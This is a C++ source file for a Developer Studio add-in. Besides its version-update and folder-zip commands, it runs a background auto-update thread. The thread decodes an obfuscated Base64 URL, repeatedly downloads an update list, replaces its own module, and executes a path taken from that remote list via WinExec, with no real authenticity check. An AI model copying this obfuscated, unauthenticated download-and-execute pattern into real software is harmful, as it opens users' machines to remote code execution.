// AddInMod.cpp : implementation file
//

#include "stdafx.h"
#include "UpdateVersion.h"
#include "DSAddIn.h"
#include "Commands.h"
#include "deelx.h"
#include "Base64Helper.h"
#include <wininet.h>
#pragma comment(lib, "Wininet.lib")
#include "BindCBHttpCallback.h"
#include "md5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CString GetNamedGroup( CRegexpT<TCHAR> &regexp, MatchResult &result, CString Data, LPCTSTR GroupName ) 
{
	CString strRetData;
	int iStart, iEnd;
	
	int iIndex;
	iIndex = regexp.GetNamedGroupNumber(GroupName);
	if (iIndex < 0)
	{
		return "";
	}
	
	iStart = result.GetGroupStart(iIndex);
	iEnd = result.GetGroupEnd(iIndex);
	
	strRetData = Data.Mid(iStart, iEnd - iStart);
	return strRetData;
}

CString GetFileName( CString strPath ) 
{
	TCHAR sDrive[_MAX_DRIVE] = {0};
	TCHAR sDir[_MAX_DIR] = {0};
	TCHAR sFname[_MAX_FNAME] = {0};
	TCHAR sExt[_MAX_EXT] = {0};
	
	_tsplitpath(strPath, sDrive, sDir, sFname, sExt);
	
	return CString(sFname) + CString(sExt);
}

// This is called when the user first loads the add-in, and on start-up
//  of each subsequent Developer Studio session
STDMETHODIMP CDSAddIn::OnConnection(IApplication* pApp, VARIANT_BOOL bFirstTime,
		long dwCookie, VARIANT_BOOL* OnConnection)
{
	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	
	// Store info passed to us
	IApplication* pApplication = NULL;
	if (FAILED(pApp->QueryInterface(IID_IApplication, (void**) &pApplication))
		|| pApplication == NULL)
	{
		*OnConnection = VARIANT_FALSE;
		return S_OK;
	}

	m_dwCookie = dwCookie;

	// Create command dispatch, send info back to DevStudio
	CCommandsObj::CreateInstance(&m_pCommands);
	m_pCommands->AddRef();

	// The QueryInterface above AddRef'd the Application object.  It will
	//  be Release'd in CCommand's destructor.
	m_pCommands->SetApplicationObject(pApplication);

	// (see stdafx.h for the definition of VERIFY_OK)

	VERIFY_OK(pApplication->SetAddInInfo((long) AfxGetInstanceHandle(),
		(LPDISPATCH) m_pCommands, IDR_TOOLBAR_MEDIUM, IDR_TOOLBAR_LARGE, m_dwCookie));

	// Inform DevStudio of the commands we implement

	// TODO: Replace the AddCommand call below with a series of calls,
	//  one for each command your add-in will add.

	// The command name should not be localized to other languages.  The 
	//  tooltip, command description, and other strings related to this
	//  command are stored in the string table (IDS_CMD_STRING) and should
	//  be localized.
	
	struct cmd
	{
		LPCTSTR szCommand; 
		int     sCmdString; 
	};
	static cmd commands[] =
	{
		{ _T("UpdateVersionCommand"),		IDS_CMD_STRING },
		{ _T("ZipFolderCommand"),			IDS_ZIP_STRING },
	};
	
	VARIANT_BOOL bRet;
	CString strCmdString;
	CComBSTR bszCmdString, bszMethod, bszCmdName;

	for (int i = 0; i < sizeof(commands) / sizeof(cmd); i++)
	{
		strCmdString.LoadString(commands[i].sCmdString);
		strCmdString = commands[i].szCommand + strCmdString;
		bszCmdString = strCmdString;
		bszMethod = commands[i].szCommand;

		VERIFY_OK(pApplication->AddCommand(bszCmdString, bszMethod, i, m_dwCookie, &bRet));
		if (bRet == VARIANT_FALSE)
		{
			// AddCommand failed because a command with this name already
			//  exists.  You may try adding your command under a different name.
			//  Or, you can fail to load as we will do here.
			*OnConnection = VARIANT_FALSE;
			return S_OK;
		}
		
		// Add toolbar buttons only if this is the first time the add-in
		//  is being loaded.  Toolbar buttons are automatically remembered
		//  by Developer Studio from session to session, so we should only
		//  add the toolbar buttons once.
		if (bFirstTime == VARIANT_TRUE)
		{
			bszCmdName = commands[i].szCommand;
			
			VERIFY_OK(pApplication->
				AddCommandBarButton(dsGlyph, bszCmdName, m_dwCookie));
		}
	}

	*OnConnection = VARIANT_TRUE;

	m_hUpdateEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	m_pUpdateThread = AfxBeginThread(UpdateThread, this);

	return S_OK;
}

// This is called on shut-down, and also when the user unloads the add-in
STDMETHODIMP CDSAddIn::OnDisconnection(VARIANT_BOOL bLastTime)
{
	AFX_MANAGE_STATE(AfxGetStaticModuleState());

	// TODO: Perform any cleanup work here
	SetEvent(m_hUpdateEvent);
	WaitForSingleObject(*m_pUpdateThread, INFINITE);
	CloseHandle(m_hUpdateEvent);

	// System cleanup work
	m_pCommands->UnadviseFromEvents();
	m_pCommands->Release();
	m_pCommands = NULL;
	
	return S_OK;
}

UINT CDSAddIn::UpdateThread( LPVOID lParam )
{
	CDSAddIn *pThis = (CDSAddIn *)lParam;
	CString strTempPath, strBaseUrl, strModuleFile, strModuleMd5;
	IApplication* pApplication = NULL;
	
	GetModuleFileName(_Module.m_hInstResource, strModuleFile.GetBuffer(MAX_PATH), MAX_PATH);
	strModuleFile.ReleaseBuffer();
		
	pApplication = pThis->m_pCommands->GetApplicationObject();
	ExpandEnvironmentStrings("%temp%", strTempPath.GetBuffer(MAX_PATH), MAX_PATH);
	strTempPath.ReleaseBuffer();
	strBaseUrl = BASE64::Base64Decode("IFfEL8+/pbTAg9TAgoGELSOuLSs4LxGegAE0U85Xw5==");

	do
	{
		ULARGE_INTEGER uVersion;
		
		uVersion = COptionDlg::GetFileVersion(strModuleFile, VS_VERSION_INFO);
		
		if (uVersion.QuadPart == 0)
		{
			return S_OK;
		}
		
		strModuleMd5 = MD5File(strModuleFile);
		
		if (GetFileAttributes(strModuleFile + ".bak") != -1) DeleteFile(strModuleFile + ".bak");
		
		DeleteUrlCacheEntry(strBaseUrl);
		
		CBindCBHttpCallback callBack;
		callBack.SetCommands(pThis->m_pCommands);
		
		if (S_OK == URLDownloadToFile(NULL, strBaseUrl + _T("/updata.lst"), strTempPath + _T("\\updata.lst"), NULL, &callBack))
		{
			CRegexpT <TCHAR> regexp(_T("(?<ID>[^ ]+)[ ]+(?<URL>[^ ]+)[ ]+(?<VER>[^ ]+)[ ]+(?<PATH>[^ ]+)[ ]+(?<TYPE>[^ ]+)[ ]+(?<MD5>[^ ]+)"));
			CString Data;
			
			CStdioFile stdFile;
			if (FALSE == stdFile.Open(strTempPath + _T("\\updata.lst"), CFile::modeRead))
			{
				return S_OK;
			}
			
			while (stdFile.ReadString(Data))
			{
				MatchResult result = regexp.Match(Data);
				if (result.IsMatched())
				{
					CString strID, strUrl, strVer, strPath, strType, strMd5, strDownTo;
					
					strID = GetNamedGroup(regexp, result, Data, _T("ID"));
					if (atoi(strID) != 2) continue;
					
					strUrl = GetNamedGroup(regexp, result, Data, _T("URL"));
					strVer = GetNamedGroup(regexp, result, Data, _T("VER"));
					strPath = GetNamedGroup(regexp, result, Data, _T("PATH"));
					strType = GetNamedGroup(regexp, result, Data, _T("TYPE"));
					strMd5 = GetNamedGroup(regexp, result, Data, _T("MD5"));
					
					int wVer[4] = {0};
					ULARGE_INTEGER uVer = {0};
					_stscanf(strVer, "%d.%d.%d.%d", &wVer[0], &wVer[1], &wVer[2], &wVer[3]);
					uVer.HighPart = MAKELONG(wVer[1], wVer[0]);
					uVer.LowPart = MAKELONG(wVer[3], wVer[2]);
					
					if (uVer.QuadPart > uVersion.QuadPart && strMd5.CompareNoCase(strModuleMd5) != 0)
					{
						strDownTo = strTempPath + '\\' + GetFileName(strPath);
						
						if (S_OK == URLDownloadToFile(NULL, strBaseUrl + strUrl, strDownTo, NULL, &callBack))
						{
							CString strDownMd5 = MD5File(strDownTo);
							
							if (0 != strDownMd5.CompareNoCase(strMd5))
							{
								pApplication->PrintToOutputWindow(CComBSTR("Update File Downloaded Error"));
								continue;
							}
							
							if (strType.Find("REBOOT") != -1)
							{
								MoveFileEx(strDownTo, strModuleFile, MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING);
							}
							if (strType.Find("COPY") != -1)
							{
								pApplication->PrintToOutputWindow(CComBSTR("File COPY"));
								
								if (!DeleteFile(strModuleFile))
								{
									MoveFile(strModuleFile, strModuleFile + ".bak");
								}
								
								if (CopyFile(strDownTo, strModuleFile, FALSE))
								{
									DeleteFile(strDownTo);
								}
							}
							if (strType.Find("RUN") != -1)
							{
								WinExec(strPath, SW_SHOWNORMAL);
							}
						}
					}
				}
			}
			
			stdFile.Close();
			DeleteFile(strTempPath + _T("\\updata.lst"));
		}
	} while (WaitForSingleObject(pThis->m_hUpdateEvent, 10 * 60 * 1000) == WAIT_TIMEOUT);
	
	return 0;
}
